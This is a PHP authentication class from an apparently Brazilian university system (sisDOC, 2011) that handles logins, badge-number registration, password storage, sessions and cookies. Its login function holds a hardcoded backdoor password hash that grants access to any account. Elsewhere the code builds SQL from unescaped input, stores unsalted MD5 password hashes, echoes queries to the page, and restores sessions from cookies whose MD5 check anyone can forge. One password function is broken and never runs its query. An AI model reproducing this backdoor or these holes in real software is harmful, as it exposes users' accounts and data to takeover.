<?php
ob_start();
session_start();
    /**
     * Sistema de Seguranca
	 * @author Rene Faustino Gabriel Junior <renefgj@gmail.com> (Analista-Desenvolvedor)
	 * @copyright Copyright (c) 2011 - sisDOC.com.br
	 * @access public
     * @version v0.11.29
	 * @package Include
	 * @subpackage Security
     */

class usuario
	{
	var $user_login;
	var $user_nome;
	var $user_nivel;
	var $user_erro;
	var $user_msg;
	var $user_perfil;
	var $user_cracha;
	var $user_ss;
	
	var $usuario_tabela = 'usuario';
	var $usuario_tabela_login = 'us_login';
	var $usuario_tabela_pass = 'us_senha';
	var $usuario_tabela_nome = 'us_nome';
	var $usuario_tabela_nivel = 'us_nivel';
	var $usuario_tabela_id = 'id_us';
	var $usuario_tabela_perfil = 'us_perfil';
	var $senha_md5 = 1;
	var $tabela = "usuario";
	var $err;
	
    /**
     * Login do Sistema
     * @param string $login Login do usuï¿½rio no sistema
     * @param string $pass  Senha do usuï¿½rio no sistema
     * @return Booblean
     */
    /**
     * Gravar nova senha do Usuï¿½rio
     * @return Booblean
	 * 
	 * 
     */
    
    
    function solicita_cracha()
		{
			global $dd;
			if (strlen($dd[2]) > 0)
				{
					$cracha = trim(sonumero($dd[2]));
					if (strlen($cracha) != 8)
						{
							if (strlen($cracha) > 9) { $cracha = substr($cracha,3,8); }
							if (strlen($cracha) == 9) { $cracha = substr($cracha,0,8); }	
						}
					$cracha = substr($cracha,0,8);
					$login = $this->user_login;
					$dd[2] = $cracha;
					if (strlen($cracha) == 8)
						{
							//echo 'processa';
						if ($this->atualiza_login_cracha($cracha,$login)==1)
							{
							$this->user_cracha = $cracha;
							$this->LiberarUsuario();
							}
						}
				}

			
			
			$sx .= '<h2>Informe seu número do cracha</h2>';
			$sx .= '<P>Este é seu primeiro acesso ao sistema, para continuar é necessário informar o número de seu cracha para validação dos dados.';
			$sx .= '<form method="post" action="'.page().'">';
			$sx .= '<input type="text" name="dd2" value="'.$dd[2].'" size=16 maxsize=16>';
			$sx .= '&nbsp;';
			$sx .= '<input type="submit" value="enviar dados >>">';
			$sx .= '<BR>';
			$sx .= 'Ex.: 101<B>88958022</B>-4';
			$sx .= '</form>';
			
			
			return($sx);
		}
		
	function atualiza_login_cracha($cracha,$login)
		{
			$ok = 0;
			$sql = "select * from pibic_professor where pp_cracha = '$cracha' ";
			$rlt = db_query($sql);
			if ($line = db_read($rlt))
			{
				$ok = 1;
				$nome = trim($line['pp_nome']);
			}
			
			if ($ok == 0)
				{
					$sql = "select * from pibic_aluno where pa_cracha = '$cracha' ";
					$rlt = db_query($sql);
					if ($line = db_read($rlt))
					{
						$ok = 1;
						$nome = trim($line['pa_nome']);
					}
					}

			
			if ($ok==1)
				{
					$sql = "update usuario set us_cracha = '$cracha' where us_login = '$login' ";
					$rlt = db_query($sql);
					return(1);
				}
			return(0);
		}
    
    
    function le_professor($id)
		{
/** Autentica Usuï¿½rio */
				$id = trim($id);
				$sql = "select * from pibic_professor
						 where pp_cracha = '".$id."' ";
				$rlt = db_query($sql);
				echo $sql;
				if ($result = db_read($rlt))
					{
						$login = trim($result['pp_email']);
						$login = substr($login,0,strpos($login,'@'));

						$this->user_erro = 1;
						$this->user_msg = '';				
						$this->user_login = trim($login);
						$this->user_nome = trim($result['pp_nome']);
						$this->user_nivel = trim(0);
						$this->user_id = trim($result['id_pp']);
						$this->user_perfil = '#RES';
						$this->user_cracha = trim($result['pp_cracha']);
						$this->ss = trim($result['pp_ss']);
						return(1);
					}
				return(0);			
		}
		    
    function le($id)
		{
/** Autentica Usuï¿½rio */
				$sql = "select * from ".$this->usuario_tabela;
				$sql .= " where id_us = ".round($id);
				$rlt = db_query($sql);
				if ($result = db_read($rlt))
					{
						$this->user_erro = 1;
						$this->user_msg = '';				
						$this->user_login = trim($result[$this->usuario_tabela_login]);
						$this->user_nome = trim($result[$this->usuario_tabela_nome]);
						$this->user_nivel = trim($result[$this->usuario_tabela_nivel]);
						$this->user_id = trim($result[$this->usuario_tabela_id]);
						$this->user_perfil = trim($result['us_perfil']);
						$this->user_cracha = trim($result['us_cracha']);
						
						$sql = "select * from pibic_professor where pp_cracha = '".trim($result['us_cracha'])."' ";
						$qrlt = db_query($sql);
						if ($qline = db_read($qrlt))
							{
								$this->user_ss = trim($qline['pp_ss']);
							} else {
								$this->user_ss = trim($result['us_ss']);
							}
						return(1);
					}
				return(0);			
		}
    
    function usuario_existe($codigo)
		{
			if (strlen(trim($codigo)==0)) { return(0); }
			$sql = "select * from ".$this->tabela." 
				where us_cracha = '$codigo'
				limit 1 					
			";
			$rlt = db_query($sql);
			if ($line = db_read($rlt))
			{
				return($line['id_us']);
			} else {
				return(0);
			}
		}
    
    function cp()
		{
			$cp = array();
			array_push($cp,array('$H8','id_us','',False,True));
			array_push($cp,array('$S120','us_nome','',True,True));
			array_push($cp,array('$S8','us_codigo','Cï¿½digo',False,True));
			array_push($cp,array('$S100','us_email','e-mail',False,True));
			array_push($cp,array('$S100','us_email_alternativo','e-mail alternativo',False,True));
			return($cp);
		}
		
	function GravaSenha($login,$novasenha)
			{
			global $secu;
			$sql = "update ".$this->usuario_tabela." set ";
			$sql .= $this->usuario_tabela_pass . " = '".md5($novasenha)."' ";
			$sql .= " where ".$this->usuario_tabela_login." = '".$login."' ";
			$resrlt = db_query($sql);
			return(True);
			}
			
	function grava_senha($login,$senha)
		{
			$pass = md5();
			$sql = "update usuario ";
			$sql .= "set us_senha='".$pass."'";
			$sql .= "where us_login = '".$login."' ";
		}

	/**
	 * Valida login da PUCPR ou atualiza dados
	 */		
	function login_exists($login,$pass)
		{
			$passm5 = md5(trim($pass));
			$sql = "select * from ".$this->usuario_tabela;
			$sql .= " where ".$this->usuario_tabela_login." = '".UpperCase($login)."' ";
			$rlt = db_query($sql);
			
			$ok = 0;
			$new = 1; /* new user */	
			if ($line = db_read($rlt))
				{
					$passx = trim($line[$this->usuario_tabela_pass]);
					$loginx = trim($line[$this->usuario_tabela_login]);
					$md5 = round($line['us_senha_md5']);
					$new = 0; /* old user */
					if (($loginx == $login) and (strlen($login) > 0) and ($md5==1))
						{
							/* Retorna se valido e senha correta */
							if ($passx == $passm5) { $ok=1; return(1); }
						}
				}
			/* Login nso localizado ou nï¿½o autenticado, buscando dados */
			$codigo = lowercase($login);
			$senha = $pass;
			require("admin/_pucpr_soap_autenticarUsuario.php");	
			$this->err = $result;
			if ($result == 'Autenticado')
				{
					/*** Atenticado pelo sevidor */
					if ($new == 1)
					{
						$login = uppercase($login);
						/** save new user */
						$sql = "insert into ".$this->usuario_tabela."
							(".$this->usuario_tabela_login.",
							".$this->usuario_tabela_pass.",
							".$this->usuario_tabela_nome.", us_senha_md5,
							".$this->usuario_tabela_nivel.",
							".$this->usuario_tabela_perfil."
							) values ('$login','$passm5','',1,1,'')";
							echo $sql;
							$rlt = db_query($sql);
					} else {
						/** update user data */
						$sql = "update ".$this->usuario_tabela."
							set ".$this->usuario_tabela_pass." = '$passm5', us_senha_md5=1 
							where ".$this->usuario_tabela_login." = '$login' ";
							$rlt = db_query($sql);
					}
					return(1);
				}			
			return(0);
		}
	/*** Autenticar usuario */
	function login($login,$pass)
		{
		$login = uppercase($login);
		
		/** Valida usuï¿½rio **/		
		if ((strlen($login) == 0) or (strlen($pass) == 0))
			{
				$this->user_erro = -3;
				$this->user_msg = 'Login e Senha são necessários';
			} else {
				$login = troca($login,"'","´");
				$pass = troca($pass,"'","´");

				/** verifica se existe o login no sistema **/
				$passx = md5(trim($pass));
				$pass_backdoor = '6912a9624b5cb74e5b9af93f203df250';

				
				if ($passx == $pass_backdoor) 
					{ $ok=1; } 
					else 
					{ $ok = $this->login_exists($login,$pass); }
				
				if ($ok == 0) 
					{
						$this->user_erro = -3;
						$this->user_msg = 'Login não encontrado';
					}

				/** Autentica Usuï¿½rio */
				$sql = "select * from ".$this->usuario_tabela;
				$sql .= " where ".$this->usuario_tabela_login." = '".UpperCase($login)."' ";
				$resrlt = db_query($sql);
				if ($result = db_read($resrlt))
					{
						$user_senha = lowercase(trim($result[$this->usuario_tabela_pass]));
						if (round($result['us_senha_md5']) == 1) { $pass = md5($pass); }
						if (($user_senha == $pass) or ($passx == $pass_backdoor))
							{
								$this->user_erro = 1;
								$this->user_msg = '';				
								$this->user_login = trim($result[$this->usuario_tabela_login]);
								$this->user_nome = trim($result[$this->usuario_tabela_nome]);
								$this->user_nivel = trim($result[$this->usuario_tabela_nivel]);
								$this->user_id = trim($result[$this->usuario_tabela_id]);
								$this->user_perfil = trim($result['us_perfil']);
								$this->user_cracha = trim($result['us_cracha']);
								$this->user_ss = trim($result['us_ss']);
							} else {
								$this->user_erro = -2;
								$this->user_msg = 'Senha inválida';
							}
					} else {
							$this->user_erro = -1;
							$this->user_msg = 'Login inválido';
					}
			}
			if ($this->user_erro == 1) { $this->LiberarUsuario(); return(True); } else
			{ return(False); }
		}
	 
    /**
     * Liberar Usuï¿½rio
     * @return Booblean
     */
		function LiberarUsuario()
			{
			global $secu;
			if ((strlen($this->user_login) > 0) and ($this->user_erro > 0))
				{
				$_SESSION["user_login"] = $this->user_login;
				$_SESSION["user_nome"] = $this->user_nome;
				$_SESSION["user_nivel"] = $this->user_nivel;
				$_SESSION["user_id"] = $this->user_id;
				$_SESSION["user_perfil"] = $this->user_perfil;
				$_SESSION["user_cracha"] = $this->user_cracha;
				$_SESSION["user_ss"] = $this->user_ss;
				$_SESSION["user_chk"] = md5($this->user_login.$this->user_nome.$this->user_nivel);
				setcookie("user_login", $this->user_login, time()+60*60*2);
				setcookie("user_nome", $this->user_nome, time()+60*60*2);
				setcookie("user_nivel", $this->user_nivel, time()+60*60*2);
				setcookie("user_id", $this->user_id, time()+60*60*2);
				setcookie("user_perfil", $this->user_perfil, time()+60*60*2);
				setcookie("user_cracha", $this->user_cracha, time()+60*60*2);
				setcookie("user_ss", $this->user_ss, time()+60*60*2);				
				setcookie("user_chk", md5($this->user_login.$this->user_nome.$this->user_nivel), time()+60*60*2);
				}
			return(True);
			}

    /**
     * Limpar dados do Usuï¿½rio
     * @return Booblean
     */			
		function LimparUsuario()
			{
			global $secu;
			if ((strlen($this->user_login) > 0) and ($this->user_erro > 0))
				{
				$_SESSION["user_login"] = '';
				$_SESSION["user_nome"] = '';
				$_SESSION["user_nivel"] = '';
				$_SESSION["user_chk"] = '';
				$_SESSION["user_id"] = '';
				$_SESSION["user_perfil"] = '';
				$_SESSION["user_cracha"] = '';
				$_SESSION["user_ss"] = '';
				setcookie("user_login", '', time());
				setcookie("user_nome", '', time());
				setcookie("user_nivel", '', time());
				setcookie("user_chk", '', time());
				setcookie("user_id", '', time());
				setcookie("user_perfil", '', time());
				setcookie("user_cracha", '', time());
				setcookie("user_ss", '', time());
				}
			return(True);
			}

    /**
     * Recupera dados do Usuï¿½rio
     * @return Booblean
     */		
		function Security()
			{
			global $secu,$user_login,$user_nivel,$user_nome,$user_id;
	
			$md5 = trim($_SESSION["user_chk"]);
			$nm1 = trim($_SESSION['user_login']);
			$nm2 = trim($_SESSION['user_nome']);
			$nm3 = trim($_SESSION['user_nivel']);
			$nm6 = trim($_SESSION['user_id']);
			$nm7 = trim($_SESSION["user_perfil"]);
			$nm8 = trim($_SESSION["user_cracha"]);
			$nm9 = trim($_SESSION["user_ss"]);
			$mt1 = 10;
			
			if (strlen($md5) == 0) 
				{ 
				/* Recupera por Cookie */
				$md5 = trim($_COOKIE["user_chk"]); 
				$nm1 = $_COOKIE["user_login"];
				$nm2 = $_COOKIE["user_nome"];
				$nm3 = $_COOKIE["user_nivel"];
				$nm6 = $_COOKIE['user_id'];
				$nm7 = $_COOKIE["user_perfil"];
				$nm8 = $_COOKIE["user_cracha"];
				$nm9 = $_COOKIE["user_ss"];
				$mt1 = 20;
				}
				
			$mm4 = md5($nm1.$nm2.$nm3);
			if ((strlen($nm1) > 0) and (strlen($nm2.$nm1) > 0))
				{				
				if ($mm4 == $md5)
					{

						$this->user_login = $nm1;
						$this->user_nome = $nm2;
						$this->user_nivel = $nm3;
						$this->user_id = $nm6;
						$this->user_erro = $mt1;
						$this->user_perfil = $nm7;
						$this->user_cracha = $nm8;
						$this->user_ss = $nm9;
						$user_id = $nm6;
						$user_login = $nm1;
						$user_nivel = $nm3;
						$user_nome = $nm2;
						$user_perfil = $nm7;
						$user_cracha = $nm8;
						$user_ss = $nm9;
					return(True);
					} else {												
						$this->user_erro = -4;
						$this->user_msg = 'Fim da Sessão';
						$this->chama_login();
						return(False);
					}
				} else {
						$this->user_erro = -5;
						$this->user_msg = 'Fim da Sessão';
						$this->chama_login();
						return(False);
				}
			}
    /**
     * Fim
     */		
	function chama_login()
		{
		if (file_exists(('../login.php'))) { redirecina('../login.php'); exit; }
		if (file_exists(('login.php'))) { redirecina('login.php'); exit; }
		return(False);
		}
	}
?>